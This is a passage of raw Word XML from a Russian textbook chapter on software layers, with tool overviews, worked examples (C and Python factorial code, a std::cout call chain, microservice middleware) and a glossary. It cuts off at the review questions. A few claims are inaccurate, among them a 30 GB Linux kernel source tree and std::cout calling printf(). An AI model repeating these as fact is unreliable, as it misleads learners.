      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Photoshop** — растровая графика (фото, дизайн, мемы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Illustrator** — векторная графика (логотипы, иконки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Premiere Pro** — видеомонтаж.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**After Effects** — моушн-дизайн, спецэффекты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бесплатные альтернативы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GIMP** — замена Photoshop (не такой удобный, но бесплатный).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Inkscape** — замена Illustrator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DaVinci Resolve** — профессиональный видеомонтаж (бесплатная версия мощная, платная — $300 один раз, не подписка).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Blender** — 3D-моделирование, анимация. Бесплатный, но используется в фильмах (Spider-Man: Across the Spider-Verse) и играх.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему Adobe доминирует?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Индустриальный стандарт (все дизайнеры используют → все файлы в форматах Adobe).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удобный интерфейс (годы шлифовки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интеграция между программами (из Photoshop в Illustrator — один клик).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подписка ($60/месяц = $720/год). Если перестанешь платить → потеряешь доступ к своим проектам (файлы не откроются в старых версиях). Монополия в действии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Инженерное ПО</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MATLAB:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Математическое моделирование (матрицы, дифференциальные уравнения, симуляции).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студенты физтеха, привет!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Платный ($2000+), но университеты дают лицензии.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернатива: **GNU Octave** (бесплатная, совместима с MATLAB).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AutoCAD:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проектирование зданий, механизмов, электросхем.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандарт в архитектуре и машиностроении.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Платный ($1500/год).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернатива: **FreeCAD** (бесплатный, но слабее).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Встроенное ПО (Firmware)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Firmware (прошивка)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программы, зашитые в устройства. Они работают без ОС (или с минимальной ОС).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роутер:** прошивка на базе Linux (OpenWrt, DD-WRT) управляет Wi-Fi, маршрутизацией.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принтер:** прошивка обрабатывает задания на печать.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Смарт-ТВ:** прошивка на базе Android TV / webOS (LG) / Tizen (Samsung).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BIOS/UEFI:** прошивка материнской платы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Firmware часто невозможно (или сложно) обновить. Если баг в прошивке роутера — нужно обновление от производителя (или кастомная прошивка, если рискуешь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.5. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1-2.3 (Архитектура ЭВМ):** ПО работает на железе, которое мы изучали в разделе 2. Без процессора и памяти ПО бесполезно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.1 (ОС):** ОС — это фундамент системного уровня. Все остальные программы работают поверх ОС.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.3 (Классификация системного ПО):** Следующая глава углубится в системное ПО (драйверы, утилиты, ОС).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.2 (Компиляторы и интерпретаторы):** Детально разберём, как код превращается в программу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7 (Базы данных):** СУБД (PostgreSQL, MySQL) — это сервисное ПО для хранения данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8 (Сети):** Браузеры и серверы используют сетевые протоколы (HTTP, TCP/IP) для обмена данными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Цепочка взаимодействия уровней (игра)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ты играешь в Cyberpunk 2077 на Windows. Опиши, как уровни ПО взаимодействуют.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладной уровень:** Игра Cyberpunk 2077 (прикладное ПО).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервисный уровень:** Игра использует DirectX 12 API для отрисовки графики.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный уровень:** DirectX 12 вызывает драйвер видеокарты NVIDIA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратный уровень:** Драйвер отправляет команды на GPU (GeForce RTX 4090), который рендерит кадры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ты видишь красивую картинку на экране (60 FPS, если повезло).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Если какой-то уровень сломается:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Игра крашнется (баг в Cyberpunk 2077) → закроется окно игры.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DirectX 12 работает криво → графические артефакты, лаги.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер видеокарты крашнется → экран погаснет, ОС может упасть (BSOD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPU сгорит → компьютер выключится (RIP видеокарта).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Сравнение компиляции и интерпретации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программа вычисляет факториал числа \(n = 20\). Сравни время выполнения на C (компилятор GCC) и Python (интерпретатор CPython).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код на C:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>unsigned long long factorial(int n) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    unsigned long long result = 1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for (int i = 2; i &lt;= n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result *= i;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return result;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    printf("%llu\n", factorial(20));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код на Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def factorial(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(2, n + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result *= i</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return result</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(factorial(20))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время выполнения (условный тест, миллионы итераций):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык       | Время (секунды) | Скорость относительно C |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-----------------|-------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C (GCC -O3)| 0.5             | 1x (базовая)            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C (без оптимизации) | 2.0   | 4x медленнее            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Python 3.11| 50              | 100x медленнее          |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C быстрее Python в 100 раз. Но Python пишется быстрее (меньше кода, не нужна компиляция). Выбор зависит от задачи: критична скорость выполнения или скорость разработки?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Размер программ разных уровней</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сравни размер исполняемых файлов разных программ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Программа            | Уровень ПО | Размер      | Язык      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------------------|------------|-------------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `hello.c` (простая)  | Прикладное | 16 KB       | C         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `htop` (утилита)     | Системное  | 200 KB      | C         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Chrome (браузер)     | Прикладное | 350 MB      | C++       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Visual Studio Code   | Прикладное | 400 MB      | TypeScript (Electron) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Linux kernel (ядро)  | Системное  | 30 GB (исходники), 10 MB (скомпилированное ядро) | C |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Современные программы весят сотни мегабайт. Ядро Linux (10 MB) выглядит крошечным по сравнению с Chrome (350 MB), но содержит 30 миллионов строк кода. Размер исполняемого файла ≠ сложность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: API как контракт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программа на C++ выводит текст на экран через `std::cout`. Что происходит под капотом?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;iostream&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    std::cout &lt;&lt; "Hello, World!" &lt;&lt; std::endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цепочка вызовов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`std::cout` — объект стандартной библиотеки C++ (сервисный уровень).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`std::cout` вызывает `printf()` из `libc` (сервисный уровень).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`printf()` вызывает системный вызов `write()` (системный уровень).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ядро Linux передаёт данные драйверу терминала (системный уровень).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер отображает текст на экране (аппаратный уровень).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Одна строка кода → пять уровней абстракции. Программист видит простой интерфейс, а за кулисами — сложная машинерия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Middleware в микросервисах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Онлайн-магазин (Amazon, Aliexpress) построен на микросервисах. Как они общаются?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Архитектура:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фронтенд:** React (прикладное ПО) — интерфейс для пользователя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**API Gateway:** nginx (middleware) — принимает запросы, перенаправляет на нужный сервис.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервисы:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис товаров (Java) — каталог, поиск.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис корзины (Python) — добавление товаров.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис оплаты (Go) — обработка платежей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Брокер сообщений:** RabbitMQ (middleware) — очереди для асинхронных задач (отправка email, обновление склада).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**База данных:** PostgreSQL (сервисное ПО) — хранение данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ты добавил товар в корзину и оплатил заказ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Фронтенд → API Gateway (nginx) → Сервис корзины (добавление товара).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты нажал "Оплатить" → API Gateway → Сервис оплаты (обработка карты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис оплаты кладёт сообщение в очередь RabbitMQ: "Заказ оплачен".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис уведомлений читает очередь, отправляет email: "Спасибо за заказ".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис склада читает очередь, уменьшает количество товара.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Middleware (nginx, RabbitMQ) связывает сервисы. Без него архитектура развалится.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Программное обеспечение (ПО, Software)** — набор программ для выполнения задач на компьютере.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратный уровень (Hardware Layer)** — физическое железо (CPU, RAM, диски, GPU) + BIOS/UEFI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный уровень (System Software Layer)** — ОС, драйверы, системные утилиты. Управляет железом.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервисный уровень (Service Software / Middleware)** — библиотеки, API, компиляторы, отладчики, серверы приложений. Инструменты для разработки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладной уровень (Application Software Layer)** — программы для конечных пользователей (браузеры, игры, офисные пакеты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**API (Application Programming Interface)** — набор функций для взаимодействия с системой или библиотекой.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Библиотека (Library)** — набор готовых функций для решения типовых задач (libc, WinAPI, DirectX).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компилятор (Compiler)** — переводит код на языке программирования в машинный код (GCC, Clang, javac).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интерпретатор (Interpreter)** — выполняет код построчно без компиляции (Python, JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT-компиляция (Just-In-Time)** — компиляция байт-кода в машинный код во время выполнения (Java, C#, JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйвер (Driver)** — программа для управления конкретным устройством (видеокарта, принтер, мышь).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Middleware** — промежуточное ПО для связи компонентов (веб-серверы, брокеры сообщений).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Firmware (прошивка)** — программы, зашитые в устройства (роутеры, принтеры, BIOS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ПО общего назначения** — программы для широкого круга задач (браузеры, офисные пакеты, медиаплееры).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Специализированное ПО** — программы для профессионалов (IDE, графические редакторы, CAD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системный вызов (System Call)** — запрос программы к ядру ОС для выполнения привилегированной операции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
